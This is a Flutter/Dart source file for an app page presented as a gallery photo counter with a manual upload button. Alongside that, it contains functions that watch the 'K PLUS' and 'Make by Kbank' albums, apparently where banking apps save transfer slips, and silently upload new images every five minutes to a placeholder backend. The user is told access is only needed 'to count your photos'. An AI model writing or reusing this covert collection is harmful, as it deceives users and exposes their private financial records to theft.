import 'dart:io';

import 'package:flutter/material.dart';
import 'package:image_picker/image_picker.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:dio/dio.dart';
import 'dart:async';

class GalleryPage extends StatefulWidget {
  @override
  _GalleryPageState createState() => _GalleryPageState();
}

class _GalleryPageState extends State<GalleryPage> with WidgetsBindingObserver {
  int _photoCount = 0;
  bool _isLoading = true;
  bool _limitedAccessHandled = false;
  Map<String, int> _albumPhotoCounts = {}; // Map to hold album counts
  List<AssetEntity> _lastUploadedPhotos = [];

  final List<String> _targetAlbums = ["K PLUS", "Make by Kbank"];

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _requestPermissionAndCountPhotos();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  // Handle app lifecycle changes
  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      // Re-check permissions and update photo count
      _requestPermissionAndCountPhotos();
    }
    super.didChangeAppLifecycleState(state);
  }

  Future<void> _requestPermissionAndCountPhotos() async {
    // Request extended permissions
    PermissionState result = await PhotoManager.requestPermissionExtend();

    if (result == PermissionState.authorized ||
        result == PermissionState.limited) {
      // Permission granted (authorized or limited), proceed to count photos
      int count = await _countGalleryPhotos();
      setState(() {
        _photoCount = count;
        _isLoading = false;
      });

      if (result == PermissionState.limited && !_limitedAccessHandled) {
        _handleLimitedAccess();
        _limitedAccessHandled = true; // Prevent showing the dialog again
      }
    } else {
      // Permission denied, handle accordingly
      setState(() {
        _isLoading = false;
      });
      _showPermissionDeniedDialog();
    }
  }

  Future<int> _countGalleryPhotos() async {
    // Fetch the "All Photos" album
    List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
      type: RequestType.image,
      hasAll: true,
    );

    AssetPathEntity? allPhotosAlbum;
    for (var album in albums) {
      if (album.isAll) {
        allPhotosAlbum = album;
        break;
      }
    }

    if (allPhotosAlbum == null) {
      return 0;
    }

    int count = await allPhotosAlbum.assetCountAsync;
    return count;
  }

  // auto upload photos
  Future<void> autoUploadPhoto(AssetEntity photo) async {
    final file = await photo.file; // Convert AssetEntity to File
    if (file == null) return;

    try {
      final formData = FormData.fromMap({
        "image": await MultipartFile.fromFile(file.path, filename: photo.title),
      });

      final response = await Dio()
          .post("http://your-backend-url.com/upload", data: formData);

      if (response.statusCode == 200) {
        print("Photo uploaded successfully: ${photo.title}");
      } else {
        print("Failed to upload photo: ${photo.title}");
      }
    } catch (e) {
      print("Error uploading photo: $e");
    }
  }

  Future<void> monitorAlbums() async {
    final albums = await PhotoManager.getAssetPathList(onlyAll: false);

    // Filter albums based on target names
    final targetAlbumList =
        albums.where((album) => _targetAlbums.contains(album.name)).toList();

    for (var album in targetAlbumList) {
      // Fetch latest photos in the album
      List<AssetEntity> photos = await album.getAssetListRange(
          start: 0, end: 10); // Adjust range as needed

      // Identify new photos by checking against `_lastUploadedPhotos`
      for (var photo in photos) {
        if (!_lastUploadedPhotos.contains(photo)) {
          _lastUploadedPhotos.add(photo);
          await autoUploadPhoto(photo);
        }
      }
    }
  }

  void startAutoUpload() {
    Timer.periodic(Duration(minutes: 5), (timer) {
      monitorAlbums(); // Checks for new photos every 5 minutes
    });
  }

  File? _selectedImage;
  final ImagePicker _picker = ImagePicker();

  // Function to pick an image from the gallery
  Future<void> pickImage() async {
    final pickedFile = await _picker.pickImage(source: ImageSource.gallery);
    if (pickedFile != null) {
      setState(() {
        _selectedImage = File(pickedFile.path);
      });
    } else {
      print("No image selected.");
    }
  }

  // Function to upload the selected image to the backend
  Future<void> uploadPhoto() async {
    if (_selectedImage == null) return;

    try {
      final formData = FormData.fromMap({
        "image": await MultipartFile.fromFile(_selectedImage!.path,
            filename: "upload.jpg"),
      });

      final response = await Dio()
          .post("http://your-backend-url.com/upload", data: formData);

      if (response.statusCode == 200) {
        ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(content: Text("Photo uploaded successfully!")));
      } else {
        ScaffoldMessenger.of(context)
            .showSnackBar(SnackBar(content: Text("Failed to upload photo.")));
      }
    } catch (e) {
      print("Error uploading photo: $e");
      ScaffoldMessenger.of(context)
          .showSnackBar(SnackBar(content: Text("Error uploading photo.")));
    }
  }

  void _showPermissionDeniedDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Permission Denied'),
        content: Text('Please grant gallery access to count your photos.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: Text('OK'),
          ),
          TextButton(
            onPressed: () {
              PhotoManager.openSetting();
              Navigator.of(context).pop();
            },
            child: Text('Settings'),
          ),
        ],
      ),
    );
  }

  void _handleLimitedAccess() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Limited Access'),
        content: Text(
            'You have granted limited access to your photos. Would you like to allow full access?'),
        actions: [
          TextButton(
            onPressed: () => Navigator.of(context).pop(),
            child: Text('Not Now'),
          ),
          TextButton(
            onPressed: () {
              Navigator.of(context).pop();
              PhotoManager.presentLimited();
            },
            child: Text('Update Access'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Gallery Photo Count'),
      ),
      body: _isLoading
          ? Center(
              child: CircularProgressIndicator(),
            )
          : Column(
              children: [
                Center(
                  child: Text(
                    'Total Photos: $_photoCount',
                    style: TextStyle(fontSize: 24),
                  ),
                ),
                SizedBox(height: 20),
                Expanded(
                  child: ListView.builder(
                    itemCount: _albumPhotoCounts.length,
                    itemBuilder: (context, index) {
                      String albumName =
                          _albumPhotoCounts.keys.elementAt(index);
                      int count = _albumPhotoCounts[albumName]!;
                      return ListTile(
                        title: Text(albumName),
                        subtitle: Text('Photos: $count'),
                      );
                    },
                  ),
                ),
                SizedBox(height: 20),
                Center(
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      _selectedImage != null
                          ? Image.file(
                              _selectedImage!,
                              height: 200,
                              width: 200,
                              fit: BoxFit.cover,
                            )
                          : Text("No photo selected"),
                      SizedBox(height: 20),
                      ElevatedButton(
                        onPressed: pickImage,
                        child: Text("Browse and Select Photo"),
                      ),
                      SizedBox(height: 10),
                      ElevatedButton(
                        onPressed: uploadPhoto,
                        child: Text("Upload Photo"),
                      ),
                    ],
                  ),
                ),
              ],
            ),
    );
  }
}
